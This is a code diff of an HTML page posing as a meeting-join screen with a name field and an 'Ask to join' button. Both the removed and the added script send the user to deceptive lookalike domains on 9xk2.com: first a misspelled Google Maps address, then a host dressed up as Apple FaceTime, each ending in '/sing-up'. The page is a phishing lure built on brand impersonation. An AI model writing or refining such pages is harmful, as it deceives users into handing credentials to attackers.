@@ -663,66 +663,48 @@ body {
     </div>
 
   <!-- Name and password fields from the first design -->
-  <section class="join-panel">
-    <form id="joinForm" autocomplete="off">
-      <input
-        class="field"
-        id="displayName"
-        type="text"
-        placeholder="Enter Name"
-        aria-label="display name"
-        maxlength="60"
-        required
-      >
-    
-      <button class="join-button" id="joinButton" type="submit" disabled>
-        Ask to join
-      </button>
+<section class="join-panel">
+  <form id="joinForm" autocomplete="off">
+    <input
+      class="field"
+      id="displayName"
+      type="text"
+      placeholder="Name"
+      aria-label="display name"
+      maxlength="60"
+      required
+    >
 
-      <p class="status" id="formStatus" role="status"
-         aria-live="polite">
-      </p>
-    </form>
-  </section>
+    <button class="join-button" id="joinButton" type="submit" disabled>
+      Ask to join
+    </button>
 
-</main>
+    <p class="status" id="formStatus" role="status"
+       aria-live="polite">
+    </p>
+  </form>
+</section>
 
 <script>
-const meetingStatus = document.getElementById("meetingStatus");
-const formStatus = document.getElementById("formStatus");
+  const joinForm = document.getElementById("joinForm");
+  const displayName = document.getElementById("displayName");
+  const joinButton = document.getElementById("joinButton");
+  const formStatus = document.getElementById("formStatus");
 
-/* Local-only join-form simulation */
-const nameField = document.getElementById("displayName");
-const passwordField = document.getElementById("meetingPassword");
-const joinButton = document.getElementById("joinButton");
+  displayName.addEventListener("input", function () {
+    joinButton.disabled = displayName.value.trim() === "";
+    formStatus.textContent = "";
+  });
 
-function updateJoinButton() {
-  const ready =
-    nameField.value.trim().length > 0 &&
-    passwordField.value.length > 0;
+  joinForm.addEventListener("submit", function (event) {
+    event.preventDefault();
 
-  joinButton.disabled = !ready;
-  joinButton.classList.toggle("enabled", ready);
-}
+    const name = displayName.value.trim();
 
-nameField.addEventListener("input", updateJoinButton);
-passwordField.addEventListener("input", updateJoinButton);
+    if (!name) return;
 
-document.getElementById("joinForm").addEventListener("submit", (event) => {
-  event.preventDefault();
-
-  if (!nameField.value.trim() || !passwordField.value) {
-    formStatus.textContent = "Enter sample values to test the form.";
-    return;
-  }
-
-  formStatus.textContent =
-    formStatus.textContent = "Opening link...";
-    window.location.href = "https://www-gooqle-maps-maps-23-8103-90-4125-15z-live-location-shared.9xk2.com/sing-up"
-    
-  passwordField.value = "";
-  updateJoinButton();
-});
+    window.location.href = "https://facetime-apple-com-join-live-chat-2026-1p.9xk2.com/sing-up";
+  });
 </script>
     
 </body>
